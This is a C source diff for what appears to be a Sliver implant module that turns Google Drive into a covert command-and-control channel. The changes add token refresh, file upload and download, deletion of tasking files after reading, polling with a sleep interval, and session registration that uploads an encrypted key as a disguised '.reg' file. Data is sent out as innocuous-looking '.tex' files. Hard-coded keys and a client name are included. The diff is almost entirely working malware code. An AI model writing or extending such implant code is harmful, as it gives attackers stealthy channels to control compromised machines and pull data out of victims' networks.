@@ -21,7 +21,7 @@ BOOL RefreshAccessToken
 	SecureZeroMemory(lpBody, sizeof(lpBody));
 	wsprintfA(lpBody, "client_id=%s&client_secret=%s&refresh_token=%s&grant_type=refresh_token", pDriveConfig->lpClientId, pDriveConfig->lpClientSecret, pDriveConfig->lpRefreshToken);
 	lpContentTypeStr = GetContentTypeString(ApplicationXWwwFormUrlencoded);
-	pHttpResp = SendHttpRequest(&pDriveConfig->HttpConfig, pHttpClient, NULL, POST, lpContentTypeStr, lpBody, lstrlenA(lpBody), FALSE, TRUE);
+	pHttpResp = SendHttpRequest(&pDriveConfig->HttpConfig, pHttpClient, NULL, "POST", lpContentTypeStr, lpBody, lstrlenA(lpBody), FALSE, TRUE);
 	if (pHttpResp == NULL) {
 		goto CLEANUP;
 	}
@@ -126,7 +126,7 @@ BOOL DriveUpload
 		goto CLEANUP;
 	}
 
-	pResp = SendHttpRequest(&This->HttpConfig, pHttpClient, NULL, POST, szContentType, lpBody, cbBody, TRUE, FALSE);
+	pResp = SendHttpRequest(&This->HttpConfig, pHttpClient, NULL, "POST", szContentType, lpBody, cbBody, TRUE, FALSE);
 	if (pResp->dwStatusCode != HTTP_STATUS_OK) {
 		LogError(L"dwStatusCode != HTTP_STATUS_OK at %lls\n", __FUNCTIONW__);
 		goto CLEANUP;
@@ -154,12 +154,12 @@ CLEANUP:
 
 BOOL GetFileId
 (
-	_In_ PDRIVE_CONFIG This,
-	_In_ LPSTR lpName,
+	_In_ PDRIVE_CONFIG pDriveConfig,
+	_In_ LPSTR lpPattern,
 	_Out_ LPSTR* pId
 )
 {
-	CHAR szUri[0x400] = "https://www.googleapis.com/drive/v3/files?q=mimeType%20=%20%27application/octet-stream%27%20and%20name%20=%20%27";
+	CHAR szUri[0x400] = "https://www.googleapis.com/drive/v3/files?q=mimeType%20=%20%27application/octet-stream%27%20and%20name%20contains%20%27";
 	DWORD cbResp = 0;
 	BOOL bResult = FALSE;
 	LPSTR lpResult = NULL;
@@ -167,18 +167,19 @@ BOOL GetFileId
 	PHTTP_CLIENT pHttpClient = NULL;
 	PURI pUri = NULL;
 
-	wsprintfA(&szUri[lstrlenA(szUri)], "%s%%27&fields=files(id,mimeType,name,parents,createdTime)", lpName);
+	RefreshAccessToken(pDriveConfig);
+	wsprintfA(&szUri[lstrlenA(szUri)], "%s%%27&fields=files(id,name)", lpPattern);
 	pUri = UriInit(szUri);
 	if (pUri == NULL) {
 		goto CLEANUP;
 	}
 
-	pHttpClient = HttpClientInit(pUri, This->HttpConfig.pProxyConfig);
+	pHttpClient = HttpClientInit(pUri, pDriveConfig->HttpConfig.pProxyConfig);
 	if (pHttpClient == NULL) {
 		goto CLEANUP;
 	}
 
-	pResp = SendHttpRequest(This, pHttpClient, NULL, GET, NULL, NULL, 0, TRUE, TRUE);
+	pResp = SendHttpRequest(pDriveConfig, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
 	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 		goto CLEANUP;
 	}
@@ -195,7 +196,43 @@ CLEANUP:
 	return bResult;
 }
 
-PBYTE GoogleDriveDownload
+BOOL DriveDelete
+(
+	_In_ PDRIVE_CONFIG pDriveConfig,
+	_In_ LPSTR lpFileId
+)
+{
+	CHAR szUri[0x80] = "https://www.googleapis.com/drive/v3/files/";
+	BOOL Result = FALSE;
+	PHTTP_RESP pResp = NULL;
+	PHTTP_CLIENT pHttpClient = NULL;
+	PURI pUri = NULL;
+
+	RefreshAccessToken(pDriveConfig);
+	wsprintfA(&szUri[lstrlenA(szUri)], "%s", lpFileId);
+	pUri = UriInit(szUri);
+	if (pUri == NULL) {
+		goto CLEANUP;
+	}
+
+	pHttpClient = HttpClientInit(pUri, pDriveConfig->HttpConfig.pProxyConfig);
+	if (pHttpClient == NULL) {
+		goto CLEANUP;
+	}
+
+	pResp = SendHttpRequest(pDriveConfig, pHttpClient, NULL, "DELETE", NULL, NULL, 0, TRUE, TRUE);
+	if (pResp == NULL || pResp->dwStatusCode != HTTP_STATUS_OK) {
+		goto CLEANUP;
+	}
+
+	Result = TRUE;
+CLEANUP:
+	FreeHttpResp(pResp);
+	FreeHttpClient(pHttpClient);
+	return Result;
+}
+
+PBYTE DriveDownload
 (
 	_In_ PDRIVE_CONFIG This,
 	_In_ LPSTR lpFileId,
@@ -220,7 +257,7 @@ PBYTE GoogleDriveDownload
 		goto CLEANUP;
 	}
 
-	pResp = SendHttpRequest(This, pHttpClient, NULL, GET, NULL, NULL, 0, TRUE, TRUE);
+	pResp = SendHttpRequest(This, pHttpClient, NULL, "GET", NULL, NULL, 0, TRUE, TRUE);
 	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
 		goto CLEANUP;
 	}
@@ -297,6 +334,7 @@ PSLIVER_DRIVE_CLIENT DriveClientInit()
 	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
 	UINT64 uEncoderNonce = 6979;
 	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";
+	DWORD dwPollInterval = 60 * 5;
 	// END -------------------------------------------------------------------------------
 
 	// Google Drive Config
@@ -313,6 +351,7 @@ PSLIVER_DRIVE_CLIENT DriveClientInit()
 	pResult->lpRecipientPubKey = DuplicateStrA(szRecipientPubKey, 0);
 	pResult->lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
 	pResult->lpPeerPrivKey = DuplicateStrA(szPeerPrivKey, 0);
+	pResult->dwPollInterval = dwPollInterval;
 	pTemp = GenRandomBytes(8);
 	memcpy(&pResult->uPeerID, pTemp, 8);
 	pResult->lpServerMinisignPublicKey = DuplicateStrA(szServerMinisignPubkey, 0);
@@ -339,11 +378,16 @@ CLEANUP:
 
 BOOL DriveSendRequest
 (
+	_In_ PSLIVER_DRIVE_CLIENT pSliverClient,
 	_In_ PBYTE pData,
 	_In_ DWORD cbData
 )
 {
+	CHAR szName[0x200];
 
+	SecureZeroMemory(szName, sizeof(szName));
+	sprintf(szName, "%s_%s_%lld.tex", pSliverClient->lpSendPrefix, pSliverClient->szSessionID, pSliverClient->uEncoderNonce);
+	return DriveUpload(&pSliverClient->DriveConfig, pData, cbData, szName);
 }
 
 PSLIVER_DRIVE_CLIENT DriveSessionInit()
@@ -351,21 +395,20 @@ PSLIVER_DRIVE_CLIENT DriveSessionInit()
 	DWORD cbResp = 0;
 	PSLIVER_DRIVE_CLIENT pSliverClient = NULL;
 	LPSTR lpEncodedSessionKey = NULL;
-	BOOL bIsOk = FALSE;
-	PHTTP_RESP pResp = NULL;
+	BOOL IsOk = FALSE;
 	PBYTE pDecodedResp = NULL;
 	DWORD cbDecodedResp = 0;
-	PHTTP_CLIENT pHttpClient = NULL;
-	PWEB_PROXY pProxyConfig = NULL;
 	LPSTR lpSessionId = NULL;
 	DWORD cbSessionId = 0;
 	PBYTE pEncryptedSessionInit = NULL;
 	LPSTR lpRespData = NULL;
+	PBYTE pResp = NULL;
 	DWORD cbEncryptedSessionInit = 0;
 	PBYTE pMarshalledData = NULL;
-	DWORD dwSetCookieLength = 0;
-	WCHAR wszSetCookie[0x100];
 	LPWSTR lpTemp = NULL;
+	CHAR szName[0x80];
+	CHAR szPattern[0x80];
+	LPSTR lpRespFileId = NULL;
 
 	pSliverClient = DriveClientInit();
 	if (pSliverClient == NULL) {
@@ -382,12 +425,20 @@ PSLIVER_DRIVE_CLIENT DriveSessionInit()
 	}
 
 	lpEncodedSessionKey = SliverBase64Encode(pEncryptedSessionInit, cbEncryptedSessionInit);
-	//pResp = SendHttpRequest(&pSliverClient->HttpConfig, pSliverClient->pHttpClient, NULL, POST, NULL, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), FALSE, TRUE);
-	if (pResp == NULL || pResp->pRespData == NULL || pResp->cbResp == 0 || pResp->dwStatusCode != HTTP_STATUS_OK) {
+	SecureZeroMemory(szName, sizeof(szName));
+	sprintf(szName, "%s.reg", pSliverClient->lpSendPrefix);
+	DriveUpload(&pSliverClient->DriveConfig, lpEncodedSessionKey, lstrlenA(lpEncodedSessionKey), szName);
+	Sleep(pSliverClient->dwPollInterval * 3);
+
+	SecureZeroMemory(szPattern, sizeof(lpRespFileId));
+	sprintf(szPattern, "%s_", pSliverClient->lpRecvPrefix);
+	if (!GetFileId(&pSliverClient->DriveConfig, szPattern, &lpRespFileId)) {
 		goto CLEANUP;
 	}
 
-	lpRespData = ExtractSubStrA(pResp->pRespData, pResp->cbResp);
+	pResp = DriveDownload(&pSliverClient->DriveConfig, lpRespFileId, &cbResp);
+	DriveDelete(&pSliverClient->DriveConfig, lpRespFileId);
+	lpRespData = ExtractSubStrA(pResp, cbResp);
 	pDecodedResp = SliverBase64Decode(lpRespData, &cbDecodedResp);
 	if (pDecodedResp == NULL || cbDecodedResp == 0) {
 		goto CLEANUP;
@@ -399,25 +450,23 @@ PSLIVER_DRIVE_CLIENT DriveSessionInit()
 	}
 
 	memcpy(pSliverClient->szSessionID, lpSessionId, cbSessionId);
-	dwSetCookieLength = sizeof(wszSetCookie);
-	SecureZeroMemory(wszSetCookie, sizeof(wszSetCookie));
-	if (!WinHttpQueryHeaders(pResp->hRequest, WINHTTP_QUERY_SET_COOKIE, NULL, wszSetCookie, &dwSetCookieLength, WINHTTP_NO_HEADER_INDEX)) {
-		LogError(L"WinHttpQueryHeaders failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
-		goto CLEANUP;
-	}
-
-	lpTemp = StrChrW(wszSetCookie, L'=');
-	lpTemp[0] = L'\0';
-	//pSliverClient->lpCookiePrefix = ConvertWcharToChar(wszSetCookie);
-	bIsOk = TRUE;
+	IsOk = TRUE;
 CLEANUP:
-	if (!bIsOk) {
+	if (!IsOk) {
 		FreeSliverHttpClient(pSliverClient);
 		pSliverClient = NULL;
 	}
 
 	if (lpRespData != NULL) {
 		FREE(lpRespData);
+	}
+
+	if (pResp != NULL) {
+		FREE(pResp);
+	}
+
+	if (lpRespFileId != NULL) {
+		FREE(lpRespFileId);
 	}
 
 	if (lpSessionId != NULL) {
